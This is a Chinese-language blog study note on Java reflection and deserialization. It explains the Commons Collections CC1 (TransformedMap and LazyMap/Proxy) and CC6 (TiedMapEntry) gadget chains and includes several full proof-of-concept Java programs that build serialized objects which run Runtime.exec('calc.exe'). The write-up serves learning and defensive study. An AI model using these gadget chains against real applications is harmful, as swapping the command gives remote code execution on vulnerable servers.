---
title: "java TransformedMap&LazyMap"
onlyTitle: true
date: 2022-09-03 13:05:36
categories:
- java
- CC
tags:
- CC
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B85.jpg
---

# java反射

首先，反射通常是通过class方法生成的class对象，所以可以使用比如runtime下没有而class下有的方法。比如序列化，runtime是生成对象是无法序列化的，但是class可以。所以一般都要通过class进行反序列化

## getMethod利用实例化对象方法实例化对象

* 方法.invoke(对象，参数)调用该对象下的方法

Runtime下的构造函数是私有的，只能通过Runtime.getRuntime()来获取Runtime对象。

* getMethod通过反射获取一个类的公有方法（因为重载的存在不能直接确定函数）。而invoke和getMethod的区别就是invoke会执行函数。

```java
Class clazz = Class.forName("java.lang.Runtime");
Method execMethod = clazz.getMethod("exec", String.class);
Method getRuntimeMethod = clazz.getMethod("getRuntime");
Object runtime = getRuntimeMethod.invoke(clazz);
execMethod.invoke(runtime, "calc.exe");
```

所以上述代码就是，用forName获取Runtime类并命名为clazz，用getMethod获取clazz类里的exec方法(因为exec有6个重载的原因要加string.class参数)并命名为execMethod，用getMethod获取getRuntime方法并命名为getRuntimeMethod，用getRuntimeMethod方法获取Runtime的对象，invoke执行clazz类下的getRuntimeMethod方法（也就是生成对象）并命名为runtime。最好invoke执行runtime对象的exec方法，并传入参数calc.exe。也就是打开计算器。



## getConstructor利用构造函数实例化对象

该方法实例化需要构造函数公有

* newInstance实例化类对象

* getConstructor获取**具有指定参数类型的指定类构造函数**。

```java
Class clazz = Class.forName("java.lang.ProcessBuilder");
clazz.getMethod("start").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe")));
```

forName获取ProcessBuilder类，用getMethod获取start方法。

但是ProcessBuilder的构造函数参数有`List<string>`或者`string...`。

`...`表示不确定参数个数，在底层为一个数组，所以可以直接传数组参数

* 如果要获取`List<string>`参数的构造函数，可以用List强制类型转化后传参

invoke调用getConstructor获取构造函数，然后用newInstance实例化类对象时就会调用构造函数。newInstance的参数calc.exe会作为参数传递给构造函数，然后start共享参数执行命令。即`clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe"))`是向构造函数传calc.exe参实例化对象



* 如果要执行`string...`格式的构造函数，就是要传`String[].class`

```java
Class clazz = Class.forName("java.lang.ProcessBuilder");
clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance(new String[][]{{"calc.exe"}}));
```

因为newInstance也是接收变长参数，getConstructor也是接收变长参数，所以要传二维数组



那构造函数私有呢？

## getDeclaredMethod或getDeclaredConstruct获取私有构造函数实例化对象

上面两种方法由于`getMethod`和`getConstruct`是获取类的所有**公共**方法，包括继承。所以不能获取到私有和保护方法。但是`getDeclaredMethod`和`getDeclaredConstruct`是获取声明（写）在类的方法，就能**获取到私有和保护方法**，但是不能获取继承方法

```java
Class clazz = Class.forName("java.lang.Runtime");
Constructor m = clazz.getDeclaredConstructor();
m.setAccessible(true);
clazz.getMethod("exec", String.class).invoke(m.newInstance(), "calc.exe")
```

必须写setAccessible修改作用域。因为Runtime有无参构造函数的原因，getDeclaredConstructor可以不加参数。不像ProcessBuilder有两个构造函数而且都有参数



# JAVA RMI

RMI为远程方法调用.过程有三方参与，分别为Registry,Server,Client。如果学过可信计算，可以把Registry理解为可信第三方

```java
LocateRegistry.createRegistry(1099);
Naming.bind("rmi://127.0.0.1:1099/Hello", new RemoteHelloWorld());
```

创建Registry并绑定RemoteHelloworld对象到Hello名字上。Naming.bind第一个参数是url（rmi://host:port/name)，name为远程对象的名字。本地运行时socket默认为localhost:1099。 

而在远程用Naming.rebind重新绑定对象是不行的，只有url ip为localhost才能直接调用rebind\bind等方法。（ip必须为服务器ip才能远程访问）

* list搭配lookup进行远程调用。List列出所有绑定对象后用lookup获取指定对象(BaRMIe探测危险方法)
* applet的codebase标签RMI



# JAVA反序列化

`readObject`：和`php __wakeup`类似

```java
package org.vulhub.Ser;
import java.io.IOException;

public class Person implements java.io.Serializable {
    public String name;
    public int age;
    Person(String name, int age) {
        this.name = name;
        this.age = age;
    }
    private void writeObject(java.io.ObjectOutputStream s) throws IOException {
        s.defaultWriteObject();
        s.writeObject("This is a object");
    }
    private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
        s.defaultReadObject();
        String message = (String) s.readObject();
        System.out.println(message);
    }
}
```

序列化对象时会调用writeObject方法写入内容，参数类型为ObjectOutputStream。反序列化时会调用readObject读取流，该流可以进行利用以读取前面写入的内容（也可以其他利用）

defaultWriteObject将对象可序列化字段写入输出流，也就是序列化。

s.writeObject把字符串写入流中。read同理

在代码进行到中间，也就是writeObject完的时候用SerializationDumper查看数据时发现写入的字符串放在`objectAnnotation`的位置

* objectAnnotation:序列化时开发者写入的内容会放在objectAnnotation中。readObject反序列时会读取写入内容（不用考虑类属性，任意东西都能写入）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221110210950116.png)

readObject读取写入内容后传入message，printIn输出



在URLDNS利用链里用到了hashmap，主要原因就是hashmap继承了Serializable接口



## Common-collections1 TransformMap版

下面对p神编写的简化版commoncollections1的利用链

```java
package org.vulhub.Ser;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;
public class CommonCollections1 {
public static void main(String[] args) throws Exception {
Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Runtime.getRuntime()),
new InvokerTransformer("exec", new Class[]{String.class},
new Object[]
{"calc.exe"}),
};
Transformer transformerChain = new
ChainedTransformer(transformers);
Map innerMap = new HashMap();
Map outerMap = TransformedMap.decorate(innerMap, null,
transformerChain);
outerMap.put("test", "xxxx");
}
}
```

用Transformer[]定义了transformers接口，transformers接收两个参数，分别为ConstantTransformer(构造函数时传入对象并返回该对象)，InvokerTransformer(执行任意方法)。

* InvokerTransformer接收三个参数，命令执行方法，函数参数类型，参数列表。参数类型参照前面的exec不同构造构造函数。这里选择的String.class也就是字符对象。

+ InvokerTransformer用getClass，getMethod后用invoke执行了方法。

```java
Class cls = input.getClass();
Method method = cls.getMethod(iMethodName, iParamTypes);
return method.invoke(input, iArgs);
```

ChainedTransformer将前一个回调返回结果作为后一个回调参数，现在你就知道了为什么transformers定义时传入了两个对象了，getRuntime获取的对象经过ConstantTransformer返回后作为参数传到InvokerTransformer里。因为Runtime里才有exec方法

而decorate方法是获取一个TransformedMap对象，当TransformedMap内的key和value变化时就会触发Transformer的transform()方法。 在这里也就是把transformerChain绑定在value或者key上。后续put进新元素时会改变transformvalue或者key进而触发反序列化链。

触发过程：put新元素触发hashmap的反序列化，并且transformChain开始生成runtime对象，exec执行



但是现实环境几乎没有能直接put元素的环境。需要在java原生环境找到put类操作，也就是sun.reflect.annotation.AnnotationInvocationHandler。AnnotationInvocationHandler的readObject方法里有memberValue.setValue()，在序列化时会直接触发。所以只需要把Map传进去就行了。但是这个方法是私有的，还需要反射获取



```java
ByteArrayOutputStream barr = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(barr);
oos.writeObject(obj);
oos.close();
```

由于网络传输需要用字节流而不是字符流，就需要先ByteOutputStream创建字节数组缓存区，再创建对象的序列化流后用writeObject写入序列化流。



但是执行不了，上述代码对象是由Runtime.getRuntime()实例化对象方法直接生成的。继承的是Runtime的方法，但是该类下没有serializable接口进行序列化。从开篇提的class反射生成的类具有serializable接口，所以这里要借助class进行反射。(对象具有serializable接口才能反序列化，而反序列化是从readObject入口)



所以反序列化链为：

```java
package org.vulhub.Ser;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;
public class CommonCollections1 {
    public static void main(String[] args) throws Exception {
    Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] { String.class,Class[].class }, new Object[] { "getRuntime",new Class[0] }),
        new InvokerTransformer("invoke", new Class[] { Object.class,Object[].class }, new Object[] { null, new Object[0] }),
        new InvokerTransformer("exec", new Class[] { String.class },
        new String[] {
        "calc.exe" }),
    };
    Transformer transformerChain = newChainedTransformer(transformers);
    Map innerMap = new HashMap();
    innerMap.put("godown","buruheshen");
    Map outerMap = TransformedMap.decorate(innerMap, null,transformerChain);
    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
    construct.setAccessible(true);
    Object obj = construct.newInstance(Retention.class, outerMap);

    ByteArrayOutputStream barr = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(barr);
    oos.writeObject(obj);
    oos.close();
    }
}


```

其实到这里逻辑上已经很合理了。但是还没有解释为什么反射生成AnnotationInvocationHandler对象obj的时候向构造函数传的参是Retention.class。这是因为在通往setValue的时候遇到了问题，在AnnotationInvocationHandler的readObject时需要经过一个if判断才能继续setValue。

```java
if (var7 != null) {
	Object var8 = var5.getValue();
	if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
    }
}
```

绕过这个if判断的条件就是

​	1.AnnotationInvocationHandler构造函数第一个参数是Annotation子类且包含至少一个方法，假设为X。

​	2.TransformedMap.decorate绑定的Map中有一个X元素

Retention.class就符合子类和至少一个方法的条件。方法叫value，所以`innerMap.put("value","buruheshen");`

完整payload就是改一下put元素,在最后readobject序列化对象触发

```java
package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;
public class CC1 {
        public static void main(String[] args) throws Exception {
                Transformer[] transformers = new Transformer[] {
                        new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod", new Class[] { String.class,Class[].class }, new Object[] { "getRuntime",new Class[0] }),
                        new InvokerTransformer("invoke", new Class[] { Object.class,Object[].class }, new Object[] { null, new Object[0] }),
                        new InvokerTransformer("exec", new Class[] { String.class },
                                new String[] {"calc.exe" }),
                };
                Transformer transformerChain = new ChainedTransformer(transformers);
                Map innerMap = new HashMap();
                innerMap.put("value","buruheshen");
                Map outerMap = TransformedMap.decorate(innerMap, null,transformerChain);
                Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
                Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
                construct.setAccessible(true);
                Object obj = construct.newInstance(Retention.class, outerMap);

                ByteArrayOutputStream barr = new ByteArrayOutputStream();
                ObjectOutputStream oos = new ObjectOutputStream(barr);
                oos.writeObject(obj);
                oos.close();

                ObjectInputStream ois = new ObjectInputStream(new
                        ByteArrayInputStream(barr.toByteArray()));
                Object o = (Object)ois.readObject();
        }
}

```



下面是测试图：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221118220422652.png)

## $LazyMap$反序列化链

上述反序列化链是由TransformMap搭配AnnotationInvocationHandler的readObject修改Map触发，其中最后一步就是setValue。不通过setValue触发也是可以的捏。

LazyMap.decorate绑定的Map，在get找不到值时会触发transform。AnnotationInvocationHandler有setValue但是没有get方法，不过该类下的invoke方法有get调用。用到`java.reflect.Proxy`触发Invoke。而触发的具体原理可以参考：`https://www.jianshu.com/p/774c65290218`。理解不了也没事，只需要知道Proxy代理能触发重写的InvocationHandler。

 ![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119120313598.png)

LazyMap的CC链反序列化流程：

1. transfromChain的链一样，绑定到lazyMap上。

   `Map outerMap = LazyMap.decorate(innerMap, transformerChain);`

2. 反射得到AnnotationInvocationHandler构造函数，传入outMap实例化对象。调用outMap需要get获取值

3. 借助proxy对象代理，自动调用AnnotationInvocationHandler的invoke的get方法。



上述代码只需要修改：

```java
	Map outerMap = LazyMap.decorate(innerMap, transformerChain);
	Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
	Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);
	construct.setAccessible(true);
	InvocationHandler handler = (InvocationHandler)construct.newInstance(Retention.class,outerMap);
	Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class},handler);
	handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);
```

最后要再实例化的原因是入口点是AnnotationInvocationHandler的readObject，而proxy是Map对象，入口不对

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119135414510.png)

正常执行是没问题的，但是在调试时可能会弹两遍甚至是三遍计算器。根据上面的对象代理知道Proxy代理了map对象(Map proxyMap定义后)，执行一遍map就会触发一遍payload。可以学习ysoserial先new ChainedTransformer假数组，最后再利用getDeclaredField获取私有方法iTransformers，把真正的Transformer数组设置进去

完整的poc：

```java
package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
import java.lang.reflect.Field;
public class CommonCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,Class[].class }, new Object[] { "getRuntime",new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] {"calc.exe" }),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);//先绑定假transform
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)construct.newInstance(Retention.class,outerMap);
        Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class},handler);
        handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new
                ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```



 

## 高版本CC6

再想一遍cc1利用AnnotationInvocationHandler的原因，是因为AnnotationInvocationHandler可以put或者get原map对象，从而触发transform。在高版本时进行了修复，该类的readObject复制了一份linkedHashMap对象，而不是直接用传入的对象，自然也就不能触发transform

那就直接不用AnnotationInvocationHandler了，他不给我们用就不惯着它，在`org.apache.commons.collections.keyvalue.TiedMapEntry`中hashcode调用了getValue方法，getValue调用了map.get。所以只需要找到hashcode的调用

* ysoserial是⽤` java.util.HashSet#readObject `到` HashMap#put() `到 `HashMap#hash(key)`最后到 `TiedMapEntry#hashCode()`

* p神是`java.util.HashMap#readObject` 到` HashMap#hash()`到`TiedMapEntry#hashCode()`

HashMap的部分内容如下：

```java
static final int hash(Object key) {
     int h;
     return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
 }
private void readObject(java.io.ObjectInputStream s)
 throws IOException, ClassNotFoundException {
     s.defaultReadObject();
     for (int i = 0; i < mappings; i++) {
         @SuppressWarnings("unchecked")
         K key = (K) s.readObject();
         @SuppressWarnings("unchecked")
         V value = (V) s.readObject();
         putVal(hash(key), key, value, false, false);
 	}
 }
```

readObject调用了hash(key)，hash(key)又调用了hashcode。所以key==TieMapEntry对象时，构成Gadget

构造反序列化链流程：

1. 构造lazyMap，和前面的lazyMap一样

   `Map outerMap = LazyMap.decorate(innerMap, transformerChain);`

2. 把lazyMap的对象作为TieMapEntry的map属性，放入构造函数

   `TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");`

3. 将tem作为HashMap的一个key。这样就能调用到hash(key)->hashcode了。lazyMap那里要用到一个HashMap，因为要继承Serializable接口，这里要用到一个HashMap存放TiedMapEntry的对象

```java
Map expMap = new HashMap();
expMap.put(tme, "valuevalue");
```

就完事了。但有个问题，expMap.put(tme,"valuevalue")，put方法也像readObject一样，调用了一遍hash(key)

```java
public V put(K key, V value) {
 return putVal(hash(key), key, value, false, true);
}
```

就导致lazyMap被调用了两遍，第一遍是fakeTransformers，第二遍是恶意的transformers。

faketransformers虽然没有触发命令执行，但是向tme添加了"keykey"的key(hashmap的key需要为"keykey",不能改键值)，导致第二次没能进入if判断

画个图：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119175745839.png)

> 最后触发命令执行的transformer: key==keykey时输出true，不进入循环
>
> ```java
> public Object get(Object key){
>     if(map.containsKey(key)==false){
>         Object value=factory.transform(key);
>         map.put(key,value);
>         return value;
>     }
> }
> ```
>
> 

解决办法:outerMap.remove("keykey")

完整poc:

```java
package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import java.util.HashMap;
import java.util.Map;
import java.lang.reflect.Field;
public class CommonCollections6 {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,Class[].class }, new Object[] { "getRuntime",new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] {"calc.exe" }),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);//先绑定假transform
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new
                ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```



测试图：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119181540847.png)



工具推荐：SerializationDumper  16进制序列化内容转字符串

ysoserial  用户根据自己的利用链生成反序列化数据



 由于是阅读p神的《java安全漫谈》学习的，那帮P神做个宣传吧。文章或许有许多错误，请指正

> 我正在「代码审计」和朋友们讨论有趣的话题，你⼀起来吧？
> https://t.zsxq.com/08Yb